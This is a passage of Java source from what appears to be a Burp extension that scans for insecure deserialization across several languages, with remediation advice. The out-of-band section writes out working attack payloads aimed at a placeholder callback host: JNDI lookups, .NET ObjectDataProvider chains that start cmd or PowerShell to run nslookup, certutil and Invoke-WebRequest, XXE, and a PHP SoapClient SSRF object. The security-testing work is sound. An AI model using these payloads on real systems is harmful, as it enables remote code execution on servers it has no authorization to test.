                    .responseEvidence("py/reduce")
                    .build());
        }

        // Hessian content-type in response
        for (var header : response.headers()) {
            if (header.name().equalsIgnoreCase("Content-Type")
                    && JAVA_HESSIAN_CONTENT_TYPE.matcher(header.value()).find()) {
                findings.add(Finding.builder("deser-scanner",
                                "Java Hessian serialization in response",
                                Severity.MEDIUM, Confidence.CERTAIN)
                        .url(url)
                        .evidence("Content-Type: " + header.value())
                        .description("Hessian serialization protocol detected. Hessian can be exploited "
                                + "via crafted objects. Remediation: Implement allowlist-based class filtering.")
                        .responseEvidence(header.value())
                        .build());
                break;
            }
        }

        // Set-Cookie with serialized data (all languages)
        for (var header : response.headers()) {
            if (header.name().equalsIgnoreCase("Set-Cookie")) {
                String val = header.value();
                if (JAVA_MAGIC_BYTES_B64.matcher(val).find()) {
                    findings.add(Finding.builder("deser-scanner",
                                    "Java serialized object in Set-Cookie",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .evidence("Set-Cookie contains Base64 Java serialized data")
                            .description("Server sets a cookie containing a Java serialized object. "
                                    + "If the cookie is deserialized on subsequent requests, this is exploitable.")
                            .responseEvidence("rO0AB")
                            .build());
                }
                if (RUBY_MARSHAL_B64.matcher(val).find()) {
                    findings.add(Finding.builder("deser-scanner",
                                    "Ruby Marshal object in Set-Cookie",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .evidence("Set-Cookie contains Base64-encoded Ruby Marshal data")
                            .description("Server sets a cookie containing a Ruby Marshal object. "
                                    + "If Marshal.load is used on this cookie, it is exploitable for RCE.")
                            .responseEvidence("BAh")
                            .build());
                }
                // Check decoded Set-Cookie for PHP serialized data
                String cookieVal = val;
                int eqIdx = val.indexOf('=');
                if (eqIdx > 0) {
                    int scIdx = val.indexOf(';', eqIdx);
                    cookieVal = scIdx > 0 ? val.substring(eqIdx + 1, scIdx) : val.substring(eqIdx + 1);
                }
                String decoded = tryBase64Decode(cookieVal.trim());
                if (decoded != null && PHP_SERIALIZED.matcher(decoded).find()) {
                    findings.add(Finding.builder("deser-scanner",
                                    "PHP serialized data in Set-Cookie (base64-encoded)",
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url)
                            .evidence("Set-Cookie value base64-decodes to PHP serialized object")
                            .description("Server sets a cookie containing base64-encoded PHP serialized data. "
                                    + "If unserialize() processes this cookie, it is a deserialization target.")
                            .responseEvidence(decoded.substring(0, Math.min(60, decoded.length())))
                            .build());
                }
            }
        }
    }

    // ==================== ACTIVE TESTING ====================

    private void activeTest(HttpRequestResponse original, DeserPoint dp) throws InterruptedException {
        String url = original.request().url();

        // Phase 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
            activeTestOob(original, dp, url);
        }

        // Phase 2: Language-specific active testing (skip if OOB already confirmed)
        if (oobConfirmedParams.contains(dp.name)) return;

        switch (dp.language) {
            case "Java":
                activeTestJava(original, dp, url);
                if (oobConfirmedParams.contains(dp.name)) return;
                activeTestJavaSubFrameworks(original, dp, url);
                break;
            case ".NET":
                activeTestDotNet(original, dp, url);
                break;
            case "PHP":
                activeTestPhp(original, dp, url);
                if (oobConfirmedParams.contains(dp.name)) return;
                activeTestPhpFrameworks(original, dp, url);
                break;
            case "Python":
                activeTestPython(original, dp, url);
                break;
            case "Ruby":
                activeTestRuby(original, dp, url);
                break;
            case "Node.js":
                activeTestNodeJs(original, dp, url);
                break;
        }
    }

    private void activeTestJava(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        // Try each Java gadget chain
        for (String[] chainInfo : JAVA_TIME_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1]; // Base64 gadget chain

            try {
                TimingLock.acquire();

                // Measure baseline time (multi-baseline for accuracy)
                long baselineTime = measureTime(original, dp, dp.value);
                long bt2 = measureTime(original, dp, dp.value);
                long bt3 = measureTime(original, dp, dp.value);
                baselineTime = Math.max(baselineTime, Math.max(bt2, bt3));

                // Send payload
                long payloadTime = measureTime(original, dp, payload);

                int threshold = config.getInt("deser.timeThreshold", 14000);
                if (payloadTime >= baselineTime + threshold) {
                    // Confirm
                    long confirmTime = measureTime(original, dp, payload);

                    if (confirmTime >= baselineTime + threshold) {
                        findingsStore.addFinding(Finding.builder("deser-scanner",
                                        "Java Deserialization RCE - " + chainName,
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(url).parameter(dp.name)
                                .evidence("Chain: " + chainName + " | Location: " + dp.location
                                        + " | Baseline: " + baselineTime + "ms"
                                        + " | Payload: " + payloadTime + "ms"
                                        + " | Confirm: " + confirmTime + "ms")
                                .description("Java deserialization RCE confirmed via " + chainName
                                        + " gadget chain. Time-based confirmation with double-tap. "
                                        + "Remediation: Do not deserialize untrusted data. "
                                        + "Use JSON with strict typing or implement JEP 290 deserialization filters.")
                                .payload(payload)
                                .build());
                        return;
                    }
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } finally {
                TimingLock.release();
            }
            perHostDelay();
        }
    }

    private void activeTestDotNet(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        // Phase 1: BinaryFormatter gadget chains — error-based
        for (String[] chainInfo : DOTNET_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            if (isDotNetDeserError(body)) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                ".NET Deserialization Error - " + chainName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Chain: " + chainName + " | Status: " + status
                                + " | Error in response indicates deserialization processing")
                        .description(".NET deserialization error triggered by " + chainName
                                + " payload. The application is processing serialized data. "
                                + "Remediation: Replace BinaryFormatter with JSON serialization.")
                        .payload(payload)
                        .responseEvidence("SerializationException")
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }

        // Phase 2: JSON.NET $type injection (TypeNameHandling attacks)
        for (String[] chainInfo : DOTNET_JSON_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            // Type resolution errors confirm TypeNameHandling is active
            if (body.contains("JsonSerializationException") || body.contains("Type specified in JSON")
                    || body.contains("could not be resolved") || body.contains("$type")
                    || body.contains("Error resolving type") || body.contains("Unexpected token")
                    || body.contains("Type is an interface or abstract class")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                ".NET JSON.NET Type Injection - " + chainName,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Chain: " + chainName + " | Status: " + status
                                + " | JSON.NET attempted to resolve the injected $type")
                        .description("JSON.NET is processing $type properties from user input. "
                                + "This confirms TypeNameHandling is enabled and type injection is possible. "
                                + "Remediation: Set TypeNameHandling.None or use a strict ISerializationBinder.")
                        .payload(payload)
                        .responseEvidence("$type")
                        .requestResponse(result)
                        .build());
                return;
            }

            // 500 error from type injection attempt
            if (status == 500 && isDotNetDeserError(body)) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                ".NET JSON Deserialization Error - " + chainName,
                                Severity.MEDIUM, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Chain: " + chainName + " | Status: 500"
                                + " | .NET deserialization error from JSON type injection")
                        .description("Server error triggered by JSON.NET $type injection. "
                                + "The application may be vulnerable to type-based deserialization attacks.")
                        .payload(payload)
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }

        // Phase 3: Time-based detection for BinaryFormatter chains
        for (String[] chainInfo : DOTNET_PAYLOADS) {
            String chainName = chainInfo[0];
            String payload = chainInfo[1];

            try {
                TimingLock.acquire();

                // Multi-baseline for accuracy
                long baselineTime = measureTime(original, dp, dp.value);
                long dbt2 = measureTime(original, dp, dp.value);
                long dbt3 = measureTime(original, dp, dp.value);
                baselineTime = Math.max(baselineTime, Math.max(dbt2, dbt3));

                long payloadTime = measureTime(original, dp, payload);

                int threshold = config.getInt("deser.timeThreshold", 14000);
                if (payloadTime >= baselineTime + threshold) {
                    long confirmTime = measureTime(original, dp, payload);
                    if (confirmTime >= baselineTime + threshold) {
                        findingsStore.addFinding(Finding.builder("deser-scanner",
                                        ".NET Deserialization RCE (Time-based) - " + chainName,
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(url).parameter(dp.name)
                                .evidence("Chain: " + chainName + " | Baseline: " + baselineTime + "ms"
                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
                                .description(".NET deserialization RCE confirmed via " + chainName
                                        + " with time-based double-tap. "
                                        + "Remediation: Do not use BinaryFormatter/SoapFormatter with untrusted data. "
                                        + "Migrate to System.Text.Json with strict type handling.")
                                .payload(payload)
                                .build());
                        return;
                    }
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } finally {
                TimingLock.release();
            }
            perHostDelay();
        }
    }

    /** Common .NET deserialization error patterns — only serialization-specific errors.
     *  Removed generic .NET exceptions (ObjectDisposedException, InvalidCastException,
     *  FormatException, InvalidOperationException, SecurityException, TypeInitializationException,
     *  FileLoadException, MissingMethodException) that can appear in non-deserialization contexts. */
    private boolean isDotNetDeserError(String body) {
        return body.contains("BinaryFormatter") || body.contains("SerializationException")
                || body.contains("TypeLoadException") || body.contains("TargetInvocationException")
                || body.contains("System.Runtime.Serialization") || body.contains("BadImageFormatException");
    }

    private void activeTestPhp(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        boolean reported500 = false;
        for (String[] payloadInfo : PHP_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) continue;

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            // PHP deserialization errors — require unserialize() function reference specifically;
            // __wakeup, __destruct, and Serializable can appear in documentation or generic PHP error pages
            if (body.contains("unserialize()")
                    || (body.contains("__wakeup") && body.contains("unserialize"))
                    || (body.contains("__destruct") && body.contains("unserialize"))) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "PHP Deserialization Processing Detected",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Payload: " + desc + " | PHP deserialization function referenced in error")
                        .description("PHP unserialize() is processing user input. "
                                + "Remediation: Use json_decode() instead of unserialize(). "
                                + "If serialization is required, use signed serialization (e.g., sodium_crypto_auth).")
                        .payload(payload)
                        .responseEvidence("unserialize()")
                        .requestResponse(result)
                        .build());
                return;
            }

            // 500 error — report only ONCE, keep testing for confirmed hit
            if (status == 500 && !reported500 && dp.value != null && !dp.value.isEmpty()) {
                reported500 = true;
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "PHP Deserialization Error (500)",
                                Severity.MEDIUM, Confidence.TENTATIVE)
                        .url(url).parameter(dp.name)
                        .evidence("First trigger: " + desc + " | Modified PHP serialized data caused 500 error")
                        .description("Server error when sending modified serialized PHP data. "
                                + "This suggests unserialize() is processing the input.")
                        .payload(payload)
                        .requestResponse(result)
                        .build());
            }
            perHostDelay();
        }
    }

    private void activeTestPython(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        for (String[] payloadInfo : PYTHON_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            try {
                TimingLock.acquire();

                // Multi-baseline for accuracy
                long baselineTime = measureTime(original, dp, dp.value);
                long pbt2 = measureTime(original, dp, dp.value);
                long pbt3 = measureTime(original, dp, dp.value);
                baselineTime = Math.max(baselineTime, Math.max(pbt2, pbt3));

                long payloadTime = measureTime(original, dp, payload);

                int threshold = config.getInt("deser.timeThreshold", 14000);
                if (payloadTime >= baselineTime + threshold) {
                    long confirmTime = measureTime(original, dp, payload);

                    if (confirmTime >= baselineTime + threshold) {
                        findingsStore.addFinding(Finding.builder("deser-scanner",
                                        "Python Pickle Deserialization RCE",
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(url).parameter(dp.name)
                                .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
                                .description("Python pickle deserialization RCE confirmed via time-based payload. "
                                        + "Remediation: Never unpickle untrusted data. Use JSON or implement "
                                        + "hmac signing for pickle data.")
                                .payload(payload)
                                .build());
                        return;
                    }
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } finally {
                TimingLock.release();
            }
            perHostDelay();
        }
    }

    // ==================== ACTIVE: RUBY ====================

    private void activeTestRuby(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        for (String[] payloadInfo : RUBY_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            // Time-based detection
            try {
                TimingLock.acquire();

                long baselineTime = measureTime(original, dp, dp.value);
                long rbt2 = measureTime(original, dp, dp.value);
                baselineTime = Math.max(baselineTime, rbt2);

                long payloadTime = measureTime(original, dp, payload);

                int threshold = config.getInt("deser.timeThreshold", 14000);
                if (payloadTime >= baselineTime + threshold) {
                    long confirmTime = measureTime(original, dp, payload);
                    if (confirmTime >= baselineTime + threshold) {
                        findingsStore.addFinding(Finding.builder("deser-scanner",
                                        "Ruby Deserialization RCE - " + desc,
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(url).parameter(dp.name)
                                .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
                                .description("Ruby deserialization RCE confirmed. "
                                        + "Remediation: Never use Marshal.load or YAML.load with untrusted data. "
                                        + "Use JSON.parse or YAML.safe_load instead.")
                                .payload(payload)
                                .build());
                        return;
                    }
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } finally {
                TimingLock.release();
            }

            // Error-based detection
            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result != null && result.response() != null) {
                String body = result.response().bodyToString();
                if (body.contains("Marshal") || body.contains("TypeError")
                        || body.contains("ArgumentError") || body.contains("dump format error")
                        || body.contains("incompatible marshal file format")
                        || body.contains("Psych::DisallowedClass")
                        || body.contains("Tried to load unspecified class")) {
                    findingsStore.addFinding(Finding.builder("deser-scanner",
                                    "Ruby Deserialization Error - " + desc,
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(dp.name)
                            .evidence("Payload: " + desc + " | Ruby Marshal/YAML error in response")
                            .description("Ruby deserialization error triggered. The application is processing "
                                    + "serialized data via Marshal.load or YAML.load. "
                                    + "Remediation: Use JSON.parse or YAML.safe_load.")
                            .payload(payload)
                            .responseEvidence("Marshal")
                            .requestResponse(result)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // ==================== ACTIVE: NODE.JS ====================

    private void activeTestNodeJs(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        for (String[] payloadInfo : NODEJS_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            // Time-based detection
            try {
                TimingLock.acquire();

                long baselineTime = measureTime(original, dp, dp.value);
                long nbt2 = measureTime(original, dp, dp.value);
                baselineTime = Math.max(baselineTime, nbt2);

                long payloadTime = measureTime(original, dp, payload);

                int threshold = config.getInt("deser.timeThreshold", 14000);
                if (payloadTime >= baselineTime + threshold) {
                    long confirmTime = measureTime(original, dp, payload);
                    if (confirmTime >= baselineTime + threshold) {
                        findingsStore.addFinding(Finding.builder("deser-scanner",
                                        "Node.js Deserialization RCE - " + desc,
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(url).parameter(dp.name)
                                .evidence("Payload: " + desc + " | Baseline: " + baselineTime + "ms"
                                        + " | Payload: " + payloadTime + "ms | Confirm: " + confirmTime + "ms")
                                .description("Node.js deserialization RCE confirmed. "
                                        + "Remediation: Replace node-serialize/cryo/funcster with JSON.parse. "
                                        + "Never deserialize untrusted data with eval or Function constructor.")
                                .payload(payload)
                                .build());
                        return;
                    }
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } finally {
                TimingLock.release();
            }

            // Error-based detection
            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result != null && result.response() != null) {
                String body = result.response().bodyToString();
                if (body.contains("SyntaxError") || body.contains("ReferenceError")
                        || body.contains("require is not defined")
                        || body.contains("child_process") || body.contains("_$$ND_FUNC$$_")
                        || body.contains("FUNCTION_PLACEHOLDER")
                        || body.contains("Cannot read property")
                        || body.contains("is not a function")) {
                    findingsStore.addFinding(Finding.builder("deser-scanner",
                                    "Node.js Deserialization Error - " + desc,
                                    Severity.HIGH, Confidence.FIRM)
                            .url(url).parameter(dp.name)
                            .evidence("Payload: " + desc + " | Node.js error in response")
                            .description("Node.js deserialization error triggered. The application is processing "
                                    + "serialized data via an unsafe library. "
                                    + "Remediation: Use JSON.parse instead of node-serialize/cryo/funcster.")
                            .payload(payload)
                            .responseEvidence("SyntaxError")
                            .requestResponse(result)
                            .build());
                    return;
                }
            }
            perHostDelay();
        }
    }

    // ==================== ACTIVE: JAVA SUB-FRAMEWORKS ====================

    private void activeTestJavaSubFrameworks(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        // Fastjson @type injection
        for (String[] payloadInfo : JAVA_FASTJSON_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body.contains("autoType") || body.contains("com.alibaba.fastjson")
                    || body.contains("JSONException") || body.contains("not support")
                    || body.contains("autoType is not support")
                    || body.contains("type not match")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "Fastjson @type Injection Detected - " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Payload: " + desc + " | Fastjson error in response")
                        .description("Fastjson is processing @type properties. Even if autoType is blocked, "
                                + "many bypass payloads exist for older versions. "
                                + "Remediation: Upgrade Fastjson to latest with safeMode or migrate to Gson.")
                        .payload(payload)
                        .responseEvidence("autoType")
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }

        // Jackson polymorphic type injection
        for (String[] payloadInfo : JAVA_JACKSON_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body.contains("InvalidTypeIdException") || body.contains("JsonMappingException")
                    || body.contains("InvalidDefinitionException")
                    || body.contains("Unexpected token") || body.contains("not subtype")
                    || body.contains("PolymorphicTypeValidator")
                    || body.contains("Could not resolve type id")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "Jackson Polymorphic Type Injection - " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Payload: " + desc + " | Jackson error in response")
                        .description("Jackson is processing polymorphic type data. DefaultTyping is enabled. "
                                + "Remediation: Disable DefaultTyping or use a strict PolymorphicTypeValidator.")
                        .payload(payload)
                        .responseEvidence("JsonMappingException")
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }

        // XStream XML injection
        for (String[] payloadInfo : JAVA_XSTREAM_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body.contains("XStreamException") || body.contains("ConversionException")
                    || body.contains("ForbiddenClassException")
                    || body.contains("Security framework") || body.contains("not allowed")
                    || body.contains("com.thoughtworks.xstream")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "XStream XML Deserialization - " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Payload: " + desc + " | XStream error in response")
                        .description("XStream is processing XML serialized data. "
                                + "Remediation: Upgrade XStream and configure security framework with allowlists.")
                        .payload(payload)
                        .responseEvidence("XStreamException")
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }

        // SnakeYAML injection
        for (String[] payloadInfo : JAVA_SNAKEYAML_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            if (body.contains("SnakeYaml") || body.contains("YAMLException")
                    || body.contains("could not determine a constructor")
                    || body.contains("Unable to find property")
                    || body.contains("org.yaml.snakeyaml")
                    || body.contains("Blocked by GlobalTagInspector")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "SnakeYAML Deserialization - " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Payload: " + desc + " | SnakeYAML error in response")
                        .description("SnakeYAML is processing YAML with type tags. "
                                + "Remediation: Use SafeConstructor or upgrade SnakeYAML 2.0+ with restricted tags.")
                        .payload(payload)
                        .responseEvidence("YAMLException")
                        .requestResponse(result)
                        .build());
                return;
            }
            perHostDelay();
        }
    }

    // ==================== ACTIVE: PHP FRAMEWORKS ====================

    private void activeTestPhpFrameworks(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        boolean foundError = false;
        for (String[] payloadInfo : PHP_FRAMEWORK_PAYLOADS) {
            String desc = payloadInfo[0];
            String payload = payloadInfo[1];

            HttpRequestResponse result = sendPayload(original, dp, payload);
            if (result == null || result.response() == null) { perHostDelay(); continue; }

            String body = result.response().bodyToString();
            int status = result.response().statusCode();

            // Confirmed deserialization processing — report and stop immediately
            if (body.contains("unserialize()") || body.contains("__wakeup")
                    || body.contains("__destruct") || body.contains("Serializable")
                    || body.contains("ErrorException") || body.contains("Allowed memory size")
                    || body.contains("class not found") || body.contains("cannot be converted")) {
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "PHP Framework Deserialization - " + desc,
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter(dp.name)
                        .evidence("Payload: " + desc + " | PHP deserialization error in response")
                        .description("PHP framework deserialization chain triggered processing. "
                                + "Remediation: Use json_decode() instead of unserialize().")
                        .payload(payload)
                        .responseEvidence("unserialize()")
                        .requestResponse(result)
                        .build());
                return;
            }

            // 500 error — report only ONE generic finding, not one per chain
            if (status == 500 && !foundError) {
                foundError = true;
                findingsStore.addFinding(Finding.builder("deser-scanner",
                                "PHP Deserialization Error (500)",
                                Severity.MEDIUM, Confidence.TENTATIVE)
                        .url(url).parameter(dp.name)
                        .evidence("First trigger: " + desc + " | 500 error from modified serialized data")
                        .description("Server error from PHP deserialization chain. "
                                + "Confirms unserialize() is processing user input. "
                                + "Multiple framework chains tested.")
                        .payload(payload)
                        .requestResponse(result)
                        .build());
                // Don't return — keep testing for confirmed deserialization,
                // but don't report more 500s
            }
            perHostDelay();
        }
    }

    // ==================== OOB VIA COLLABORATOR ====================

    private void activeTestOob(HttpRequestResponse original, DeserPoint dp, String url) throws InterruptedException {
        // Language-specific OOB payloads
        List<String[]> oobTemplateList = new ArrayList<>();

        switch (dp.language) {
            case "Java":
                // JNDI injection (works if app evaluates strings in JNDI context, e.g. Log4j)
                oobTemplateList.add(new String[]{"${jndi:ldap://COLLAB_PLACEHOLDER/a}", "JNDI LDAP lookup"});
                oobTemplateList.add(new String[]{"${jndi:rmi://COLLAB_PLACEHOLDER/a}", "JNDI RMI lookup"});
                oobTemplateList.add(new String[]{"${jndi:dns://COLLAB_PLACEHOLDER/a}", "JNDI DNS lookup"});
                // Fastjson @type OOB — text-based, Collaborator URL gets replaced properly
                for (String[] p : JAVA_FASTJSON_PAYLOADS) {
                    // Skip BasicDataSource: JdbcRowSetImpl doesn't implement java.sql.Driver,
                    // so driverClassName won't trigger JNDI lookup
                    if (p[1].contains("COLLAB_PLACEHOLDER")
                            && !p[0].contains("BasicDataSource")) {
                        oobTemplateList.add(new String[]{p[1], p[0]});
                    }
                }
                // Jackson polymorphic type OOB — skip SpringPropertyPathFactory (bean lookup, not JNDI)
                for (String[] p : JAVA_JACKSON_PAYLOADS) {
                    if (p[1].contains("COLLAB_PLACEHOLDER")
                            && !p[0].contains("SpringAbstractBeanFactory")) {
                        oobTemplateList.add(new String[]{p[1], p[0]});
                    }
                }
                // XStream XML OOB — skip ImageIO (no COLLAB_PLACEHOLDER + broken chain)
                for (String[] p : JAVA_XSTREAM_PAYLOADS) {
                    if (p[1].contains("COLLAB_PLACEHOLDER")
                            && !p[0].contains("ImageIO")) {
                        oobTemplateList.add(new String[]{p[1], p[0]});
                    }
                }
                // SnakeYAML OOB — skip SpringPropertyPathFactory (bean lookup, not JNDI)
                for (String[] p : JAVA_SNAKEYAML_PAYLOADS) {
                    if (p[1].contains("COLLAB_PLACEHOLDER")
                            && !p[0].contains("SpringPropertyPathFactory")) {
                        oobTemplateList.add(new String[]{p[1], p[0]});
                    }
                }
                break;
            case ".NET":
                // JSON.NET ObjectDataProvider → Process.Start → nslookup
                oobTemplateList.add(new String[]{
                        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                                + "\"MethodName\":\"Start\","
                                + "\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList, mscorlib\","
                                + "\"$values\":[\"cmd\",\"/c nslookup COLLAB_PLACEHOLDER\"]},"
                                + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                        "JSON.NET ObjectDataProvider nslookup"});
                // JSON.NET ObjectDataProvider → Process.Start → certutil (Windows-specific DNS)
                oobTemplateList.add(new String[]{
                        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                                + "\"MethodName\":\"Start\","
                                + "\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList, mscorlib\","
                                + "\"$values\":[\"cmd\",\"/c certutil -urlcache -f http://COLLAB_PLACEHOLDER/c\"]},"
                                + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                        "JSON.NET ObjectDataProvider certutil"});
                // JSON.NET ObjectDataProvider → PowerShell Invoke-WebRequest
                oobTemplateList.add(new String[]{
                        "{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\","
                                + "\"MethodName\":\"Start\","
                                + "\"MethodParameters\":{\"$type\":\"System.Collections.ArrayList, mscorlib\","
                                + "\"$values\":[\"powershell\",\"-c Invoke-WebRequest http://COLLAB_PLACEHOLDER/ps\"]},"
                                + "\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\"}}",
                        "JSON.NET ObjectDataProvider PowerShell"});
                // JSON.NET payloads with OOB — skip non-functional ones:
                // - JSON.NET Uri: AbsoluteUri is read-only; constructing Uri never makes network requests
                // - JSON.NET Assembly.Load: setting Path alone doesn't trigger download without Install()
                for (String[] p : DOTNET_JSON_PAYLOADS) {
                    if (p[1].contains("COLLAB_PLACEHOLDER")
                            && !p[0].equals("JSON.NET Uri")
                            && !p[0].equals("JSON.NET Assembly.Load")) {
                        oobTemplateList.add(new String[]{p[1], ".NET JSON " + p[0]});
                    }
                }
                // XAML-based OOB (XamlReader.Load) — DOTNET_XML_PAYLOADS is {name, payload}, remap to {payload, technique}
                for (String[] xmlPayload : DOTNET_XML_PAYLOADS) {
                    if (xmlPayload[1].contains("COLLAB_PLACEHOLDER")) {
                        oobTemplateList.add(new String[]{xmlPayload[1], ".NET XML " + xmlPayload[0]});
                    }
                }
                // BinaryFormatter with embedded URL callback (SoapFormatter variant)
                oobTemplateList.add(new String[]{
                        "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" "
                                + "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\">"
                                + "<SOAP-ENV:Body>"
                                + "<a1:ObjectDataProvider xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Windows.Data/PresentationFramework\">"
                                + "<a1:ObjectDataProvider.ObjectInstance>"
                                + "<a2:Process xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/System.Diagnostics/System\">"
                                + "<a2:Process.StartInfo>"
                                + "<a2:ProcessStartInfo a2:FileName=\"cmd\" a2:Arguments=\"/c nslookup COLLAB_PLACEHOLDER\"/>"
                                + "</a2:Process.StartInfo></a2:Process>"
                                + "</a1:ObjectDataProvider.ObjectInstance>"
                                + "</a1:ObjectDataProvider></SOAP-ENV:Body></SOAP-ENV:Envelope>",
                        "SoapFormatter ObjectDataProvider nslookup"});
                // (Removed: WebClient BaseAddress — setting BaseAddress alone doesn't trigger network activity)
                // JSON.NET XmlDocument — external entity resolution
                oobTemplateList.add(new String[]{
                        "{\"$type\":\"System.Xml.XmlDocument, System.Xml\","
                                + "\"InnerXml\":\"<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://COLLAB_PLACEHOLDER/xxe'>]><x>&xxe;</x>\"}",
                        ".NET XmlDocument XXE OOB"});
                break;
            case "PHP":
                // SoapClient SSRF — __call triggers HTTP request to location (built-in PHP, no framework needed)
                // When any method is invoked on the deserialized object, SoapClient calls the location URL
                oobTemplateList.add(new String[]{
                        "O:10:\"SoapClient\":5:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:"
                                + ("http://COLLAB_PLACEHOLDER/soap".length())
                                + ":\"http://COLLAB_PLACEHOLDER/soap\";"
                                + "s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;"
